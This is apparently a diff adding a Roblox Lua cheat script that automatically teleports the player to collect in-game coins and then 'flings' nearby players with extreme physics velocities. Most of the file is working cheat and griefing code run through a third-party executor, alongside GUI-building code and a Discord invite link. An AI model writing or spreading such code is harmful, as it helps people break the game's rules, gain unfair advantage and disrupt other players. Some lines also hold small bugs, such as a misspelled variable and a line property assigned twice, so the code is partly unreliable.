+UI["TextDF1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+UI["TextDF1"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["TextDF1"]["BackgroundTransparency"] = 1
+UI["TextDF1"]["Size"] = UDim2.new(1, 0, 1, 0)
+UI["TextDF1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["TextDF1"]["Text"] = [[0]]
+
+UI["2DF1"] = Instance.new("Frame", UI["BarDF1"])
+UI["2DF1"]["BorderSizePixel"] = 0
+UI["2DF1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["2DF1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["2DF1"]["Name"] = [[GradFrame]]
+
+UI["3DF1"] = Instance.new("UIGradient", UI["2DF1"])
+UI["3DF1"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 128)),ColorSequenceKeypoint.new(0.145, Color3.fromRGB(166, 3, 131)),ColorSequenceKeypoint.new(0.540, Color3.fromRGB(0, 86, 255)),ColorSequenceKeypoint.new(0.863, Color3.fromRGB(0, 249, 132)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 0))}
+
+UI["1DF2"] = Instance.new("Frame", UI["1"])
+UI["1DF2"]["BorderSizePixel"] = 2
+UI["1DF2"]["BackgroundColor3"] = Color3.fromRGB(74, 76, 90)
+UI["1DF2"]["Size"] = UDim2.new(0.15449, 0, 0.01911, 0)
+UI["1DF2"]["Position"] = UDim2.new(0.42248, 0, 0.17103, 0)
+UI["1DF2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["1DF2"]["Name"] = [[TimerBG]]
+
+UI["BarDF2"] = Instance.new("Frame", UI["1DF2"])
+UI["BarDF2"]["BorderSizePixel"] = 0
+UI["BarDF2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["BarDF2"]["ClipsDescendants"] = true
+UI["BarDF2"]["Size"] = UDim2.new(0, 0, 1, 0)
+UI["BarDF2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["BarDF2"]["BackgroundTransparency"] = 1
+
+UI["2DF2"] = Instance.new("Frame", UI["BarDF2"])
+UI["2DF2"]["BorderSizePixel"] = 0
+UI["2DF2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["2DF2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["2DF2"]["Name"] = [[GradFrame]]
+
+UI["3DF2"] = Instance.new("UIGradient", UI["2DF2"])
+UI["3DF2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 128)),ColorSequenceKeypoint.new(0.145, Color3.fromRGB(166, 3, 131)),ColorSequenceKeypoint.new(0.540, Color3.fromRGB(0, 86, 255)),ColorSequenceKeypoint.new(0.863, Color3.fromRGB(0, 249, 132)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 0))}
+
+function Fling(TargetPlayer)
+    local Character = Player.Character
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    local RootPart = Humanoid and Humanoid.RootPart
+
+    local TCharacter = TargetPlayer.Character
+    local THumanoid
+    local TRootPart
+    local THead
+    local Accessory
+    local Handle
+
+    if TCharacter:FindFirstChildOfClass("Humanoid") then
+        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+    end
+    if THumanoid and THumanoid.RootPart then
+        TRootPart = THumanoid.RootPart
+    end
+    if TCharacter:FindFirstChild("Head") then
+        THead = TCharacter.Head
+    end
+    if TCharacter:FindFirstChildOfClass("Accessory") then
+        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+    end
+    if Accessoy and Accessory:FindFirstChild("Handle") then
+        Handle = Accessory.Handle
+    end
+
+    if Character and Humanoid and RootPart then
+        if RootPart.Velocity.Magnitude < 50 then
+            getgenv().OldPos = RootPart.CFrame
+        end
+        if THumanoid and THumanoid.Sit and not AllBool then
+            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
+        end
+        if THead then
+            workspace.CurrentCamera.CameraSubject = THead
+        elseif not THead and Handle then
+            workspace.CurrentCamera.CameraSubject = Handle
+        elseif THumanoid and TRootPart then
+            workspace.CurrentCamera.CameraSubject = THumanoid
+        end
+        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+            return
+        end
+        
+        local FPos = function(BasePart, Pos, Ang)
+            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+        end
+        
+        local SFBasePart = function(BasePart)
+            local TimeToWait = 2
+            local Time = tick()
+            local Angle = 0
+
+            repeat
+                if RootPart and THumanoid then
+                    if BasePart.Velocity.Magnitude < 50 then
+                        Angle = Angle + 100
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+                    else
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+                        
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+                    end
+                else
+                    break
+                end
+            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+        end
+        
+        workspace.FallenPartsDestroyHeight = 0/0
+        
+        local BV = Instance.new("BodyVelocity")
+        BV.Name = "EpixVel"
+        BV.Parent = RootPart
+        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+        
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+        
+        if TRootPart and THead then
+            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+                SFBasePart(THead)
+            else
+                SFBasePart(TRootPart)
+            end
+        elseif TRootPart and not THead then
+            SFBasePart(TRootPart)
+        elseif not TRootPart and THead then
+            SFBasePart(THead)
+        elseif not TRootPart and not THead and Accessory and Handle then
+            SFBasePart(Handle)
+        else
+            return Message("Error Occurred", "Target is missing everything", 5)
+        end
+        
+        BV:Destroy()
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+        workspace.CurrentCamera.CameraSubject = Humanoid
+        
+        repeat
+            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+            Humanoid:ChangeState("GettingUp")
+            table.foreach(Character:GetChildren(), function(_, x)
+                if x:IsA("BasePart") then
+                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                end
+            end)
+            task.wait()
+        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+        workspace.FallenPartsDestroyHeight = getgenv().FPDH
+    else
+        return Message("Error Ocurrido", "El Script A Fallado", 5)
+    end
+end
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    UI["2DF1"]["Size"] = UDim2.new(0,UI["1DF1"].AbsoluteSize.X,1,0)
+    UI["2DF2"]["Size"] = UDim2.new(0,UI["1DF2"].AbsoluteSize.X,1,0)
+end)
+
+local Notifies = {}
+
+function UI:Notify(Text, timer)
+    timer = timer or 5
+    Text = Text or ""
+    for _,notify in pairs(Notifies) do
+        if notify.tween ~= nil then
+            notify.tween:Stop()
+        end
+        notify.obj.Position = UDim2.fromScale(notify.obj.Position.X.Scale, notify.obj.Position.Y.Scale-0.14)
+    end
+    UI["14"]["Text"] = Text
+    local notify = UI["12"]:Clone()
+    notify.Parent = UI["1"]
+    notify.Visible = true
+    notify.Position = UDim2.new(1.1, 0, notify.Position.Y.Scale, 0)
+    TS:Create(notify.DownBar, TweenInfo.new(timer), {Size = UDim2.new(0, 0, 0.03, 0)}):Play()
+    local twen = TS:Create(notify, TweenInfo.new(0.5), {Position = UDim2.new(0.77964, 0, notify.Position.Y.Scale, 0)}):Play()
+    local id = #Notifies+1
+    Notifies[id] = {obj = notify, tween = twen}
+    spawn(function()
+        wait(timer)
+        TS:Create(notify, TweenInfo.new(0.5), {Position = UDim2.new(1.3, 0, notify.Position.Y.Scale, 0)}):Play()
+        wait(0.5)
+        Notifies[id] = nil
+        notify:Remove()
+    end)
+end
+
+do
+	local UserInputService = game:GetService("UserInputService")
+
+	local guii = UI["2"]
+
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		guii.Position = UDim2.new(0, startPos.X.Offset+delta.X, 0, startPos.Y.Offset + delta.Y)
+	end
+
+	guii.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			scrolling = true
+			dragStart = input.Position
+			startPos = guii.Position
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+					scrolling = false
+				end
+			end)
+		end
+	end)
+
+	guii.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+
+local toggle = false
+local lastTween;
+
+local speed = 34
+
+local collide = {}
+for _,obj in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+    if obj:IsA("BasePart") then
+        if obj.CanCollide == true then
+            collide[obj.Name] = true
+        end
+    end
+end
+local currency = "SnowToken"
+function getCurrency()
+    local mainGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("MainGUI")
+    local currencyPath
+    if mainGui.Game:FindFirstChild("CoinBags",true)== nil then
+        currencyPath = mainGui.Lobby.Dock.CoinBags.Container[currency].CurrencyFrame.Icon.Coins
+    else
+        currencyPath = mainGui.Game.CoinBags.Container[currency].CurrencyFrame.Icon.Coins
+    end
+    
+    return tonumber(currencyPath.Text)
+end
+
+local lastCur = 0
+spawn(function()
+    while task.wait() do
+        local curr = getCurrency()
+        if lastCur ~= curr then
+            lastCur = curr
+            UI["TextDF1"]["Text"] = curr
+            TS:Create(UI["BarDF1"], TweenInfo.new(0.5, Enum.EasingStyle.Linear), {Size = UDim2.new((2.5*curr)/100, 0, 1, 0)}):Play()
+        end
+    end
+end)
+
+
+
+spawn(function()
+    while wait() do
+        pcall(function()
+            local map
+            for _,model in pairs(game:GetService("Workspace"):GetChildren()) do
+                if model:FindFirstChild("CoinContainer", true) ~= nil then
+                    map = model
+                    break
+                end
+            end
+            if map and getCurrency() ~= 40 then
+                local coins = map:FindFirstChild("CoinContainer")
+                if toggle then
+                    local Bcoin
+                    local Dist = math.huge
+                    for _,coin in pairs(coins:GetChildren()) do
+                        local distance = math.floor((coin.CFrame.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude)
+                        if Dist > distance and coin.CoinVisual.Transparency ~= 1 then
+                            Dist = distance
+                            Bcoin = coin
+                        end
+                    end
+                    if Dist < 200 or true then
+                        --local hroot = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
+                        --game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Anchored = true
+                        local timer = Dist/speed
+                        if Dist < 23 or Dist > 200 or getCurrency() == 0 then
+                            timer = 0
+                        end
+                        TS:Create(UI["BarDF2"], TweenInfo.new(timer, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+                        task.wait(timer)
+                        TS:Create(UI["BarDF2"], TweenInfo.new(0.1, Enum.EasingStyle.Linear), {Size = UDim2.new(0, 0, 1, 0)}):Play()
+                        
+                        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(Bcoin.CFrame.Position) * CFrame.Angles(math.rad(180),0,0)
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+                        --[[lastTween = TS:Create(game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart"), TweenInfo.new(timer, Enum.EasingStyle.Linear), {CFrame=CFrame.new(Bcoin.CFrame.Position+Vector3.new(0,1,0))}):Play()
+                        --spawn(function() 
+                            repeat
+                                task.wait()
+                                game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame * CFrame.Angles(math.rad(90),math.rad(2),0)
+                                for _,obj in pairs(hroot:GetDescendants()) do
+                                    if obj:IsA("BasePart") then
+                                        if collide[obj.Name] then
+                                            obj.CanCollide = false
+                                        end
+                                    end
+                                end 
+                            until Bcoin.CoinVisual.Transparency == 1
+                        --)
+                        --wait(timer)
+                        --game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Anchored = false
+                        for _,obj in pairs(hroot:GetDescendants()) do
+                            if obj:IsA("BasePart") then
+                                if collide[obj.Name] then
+                                    obj.CanCollide = true
+                                end
+                            end
+                        end ]]
+
+                    end
+                end
+            elseif getCurrency() == 40 and map then
+                for _,plr in pairs(game.Players:GetPlayers()) do
+                    if (map.Origin.Position - plr.Character.HumanoidRootPart.CFrame.Position).Magnitude < 100 then
+                        Fling(plr)
+                    end
+                end
+            end
+        end)
+        wait()
+    end
+end)
+
+UI["6"].MouseButton1Click:Connect(function()
+    toggle = not toggle
+    if toggle then
+        UI["6"]["TextColor3"] = Color3.fromRGB(0, 255, 0)
+    else
+        UI["6"]["TextColor3"] = Color3.fromRGB(255, 0, 0)
+        if lastTween ~= nil then lastTween:Stop() lastTween = nil end
+    end
+end)
+
+local dots = {}
+local dotLines = {}
+
+local uiWork = true
+UI["b"].MouseButton1Click:Connect(function()
+    uiWork = false
+    UI["1"]:Destroy()
+    toggle = false
+    for _,dot in pairs(dots) do
+        dot["Update"] = false
+    end
+end)
+
+UI["d"].MouseButton1Click:Connect(function()
+    setclipboard("https://discord.gg/7M4cbMk9FB")
+    UI:Notify("Copied to clipboard", 5)
+end)
+
+function distance(x1,y1,x2,y2)
+    return math.sqrt((x1-x2)^2+(y2-y1)^2)
+end
+
+function NewDot(angle)
+    local vector;
+    local dot = Instance.new("Frame", UI["2"])
+    dot["BorderSizePixel"] = 0
+    dot["BackgroundColor3"] = Color3.fromRGB(131, 148, 255)
+    dot["Size"] = UDim2.new(0, 7, 0, 7)
+    dot["Position"] = UDim2.new(0, 0, 0, 0)
+    dot["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+    dot["ZIndex"] = -1
+
+    if angle >= 315 or angle <= 45 then 
+        dot.Position = UDim2.new(1,0,math.sin(angle)/2+0.5,0)
+        vector = math.random(91,269)
+    elseif angle >= 135 and angle <= 225 then
+        dot.Position = UDim2.new(0,-7,math.sin(angle)/2+0.5,0)
+        vector = (math.random(0,1)==1 and math.random(0,89) or math.random(271,359))
+    elseif angle >= 45 and angle <= 135 then
+        dot.Position = UDim2.new(math.cos(angle)/2+0.5,0,1,0)
+        vector = math.random(181,359)
+    elseif angle >= 225 and angle <= 315 then
+        dot.Position = UDim2.new(math.cos(angle)/2+0.5,0,0,-7)
+        vector = math.random(45,135)
+    end
+
+    local corner = Instance.new("UICorner", dot)
+    corner["CornerRadius"] = UDim.new(1, 0)
+    local id = #dots+1
+    local Tdot = {}
+    Tdot["dot"] = dot
+    Tdot["Angle"] = angle
+    Tdot["Vector"] = vector
+    Tdot["Speed"] = math.random(0.1,1)
+    Tdot["X"] = dot.Position.X.Offset
+    Tdot["Y"] = dot.Position.Y.Offset
+    Tdot["Lines"] = {}
+    Tdot["Update"] = true
+    spawn(function()
+        while Tdot["Update"] do
+            local xVelocity = math.cos(Tdot["Vector"])/Tdot["Speed"] 
+            local yVelocity = math.sin(Tdot["Vector"])/Tdot["Speed"] 
+            Tdot["X"] = Tdot["X"]+xVelocity
+            Tdot["Y"] = Tdot["Y"]+yVelocity
+            if math.abs(Tdot["X"]) > UI["2"].AbsoluteSize.X and math.abs(Tdot["Y"]) > UI["2"].AbsoluteSize.Y then
+                dots[id] = nil
+                Tdot["Update"] = false
+                dot:Remove()
+            end
+            dot.Position = UDim2.new(dot.Position.X.Scale, Tdot["X"], dot.Position.Y.Scale, Tdot["Y"])
+            task.wait(0.01)
+        end
+    end)
+    
+    dots[id] = Tdot
+end
+
+spawn(function()
+    while uiWork do
+        NewDot(math.random(0,360))
+        task.wait(math.random(0.7,1.2))
+    end
+end)
+
+function serializeTable(val, name, skipnewlines, depth)
+	skipnewlines = skipnewlines or false
+    depth = depth or 2
+
+    local tmp = string.rep(" ", depth)
+    if type(name) == "number" then
+        name = "["..name.."]"
+    end
+    if name then tmp = tmp .. name .. " = " end
+
+    if type(val) == "table" then
+        tmp = tmp .. "{" .. (not skipnewlines and "\n" or "")
+
+        for k, v in pairs(val) do
+            tmp =  tmp .. serializeTable(v, k, skipnewlines, depth + 1) .. "," .. (not skipnewlines and "\n" or "")
+        end
+
+        tmp = tmp .. string.rep(" ", depth) .. "}"
+    elseif type(val) == "number" then
+        tmp = tmp .. tostring(val)
+    elseif type(val) == "string" then
+        tmp = tmp .. string.format("%q", val)
+    elseif type(val) == "boolean" then
+        tmp = tmp .. (val and "true" or "false")
+    elseif typeof(val) == "Vector3" then
+        tmp = tmp .. "Vector3.new( " .. tostring( val ) .. ")"
+    elseif typeof(val) == "Vector2" then
+        tmp = tmp .. "Vector2.new( " .. tostring( val ) .. ")"
+    elseif typeof(val) == "UDim2" then
+        tmp = tmp .. "UDim2.new( " .. tostring( val ) .. ")"
+    elseif typeof(val) == "UDim" then
+        tmp = tmp .. "UDim.new( " .. tostring( val ) .. ")"
+    elseif typeof(val) == "Instance" then
+        tmp = tmp .. val:GetFullName()
+    elseif typeof(val) == "Color3" then
+        tmp = tmp .. "Color3.new( " .. val.R .. "," .. val.G .. "," .. val.B .. ")"
+    else
+        --tmp = tmp .. tostring(val)
+        tmp = tmp .. "\"[inserializeable datatype:" .. type(val) .. "]\""
+    end
+
+    return tmp
+end
+--[[
+game:GetService("RunService").RenderStepped:Connect(function()
+    for CID,dot in pairs(dots) do
+        for CID2, dot2 in pairs(dots) do
+            if dot2 ~= dot then
+                local line = (dotLines[tostring(CID).." "..tostring(CID2)]~=nil and dotLines[tostring(CID).." "..tostring(CID2)]["obj"]) or (dotLines[tostring(CID2).." "..tostring(CID)]~= nil and dotLines[tostring(CID2).." "..tostring(CID)]["obj"]) or false
+                local lineId = (line and (dotLines[tostring(CID).." "..tostring(CID2)] or tostring(CID2).." "..tostring(CID))) or false
+                
+                if line == false then
+                    --print(serializeTable(dotLines))
+                    local dot1Pos = Vector2.new(UI["2"].AbsolutePosition.X+dot.dot.Position.X.Offset+UI["2"].AbsoluteSize.X/dot.dot.Position.X.Scale, UI["2"].AbsolutePosition.Y+dot.dot.Position.Y.Offset+UI["2"].AbsoluteSize.Y/dot.dot.Position.Y.Scale)
+                    local dot2Pos = Vector2.new(UI["2"].AbsolutePosition.X+dots[CID2].dot.Position.X.Offset+UI["2"].AbsoluteSize.X/dots[CID2].dot.Position.X.Scale, UI["2"].AbsolutePosition.Y+dots[CID2].dot.Position.Y.Offset+UI["2"].AbsoluteSize.Y/dots[CID2].dot.Position.Y.Scale)
+                    local dist = distance(dot1Pos.X,dot1Pos.Y,dot2Pos.X,dot2Pos.Y)
+                    if dist <= 100 then
+                        print("new")
+                        local line = Draw.new("Line")
+                        line.Color = Color3.fromRGB(131, 148, 255)
+                        line.From = dot1Pos
+                        line.From = dot2Pos
+                        line.ZIndex = 2
+                        line.Visible = true
+                        dotLines[tostring(CID).." "..tostring(CID2)] = {}
+                        dotLines[tostring(CID).." "..tostring(CID2)]["obj"] = line
+                    end
+                else
+                    --print("UPD")
+                    local dot1Pos = Vector2.new(UI["2"].AbsolutePosition.X+dot.dot.Position.X.Offset+UI["2"].AbsoluteSize.X/dot.dot.Position.X.Scale, UI["2"].AbsolutePosition.Y+dot.dot.Position.Y.Offset+UI["2"].AbsoluteSize.Y/dot.dot.Position.Y.Scale)
+                    local dot2Pos = Vector2.new(UI["2"].AbsolutePosition.X+dots[CID2].dot.Position.X.Offset+UI["2"].AbsoluteSize.X/dots[CID2].dot.Position.X.Scale, UI["2"].AbsolutePosition.Y+dots[CID2].dot.Position.Y.Offset+UI["2"].AbsoluteSize.Y/dots[CID2].dot.Position.Y.Scale)
+                    line.From = dot1Pos
+                    line.From = dot2Pos
+                    local dist = distance(dot1Pos.X,dot1Pos.Y,dot2Pos.X,dot2Pos.Y)
+                    if dist > 100 then
+                        line.Remove()
+                        dotLines[lineId] = nil
+                    else
+                        line.Transparency = dist/100
+                    end
+                end
+            end
+        end
+    end
+    --Draw.new("Line")
+end)
+--]]
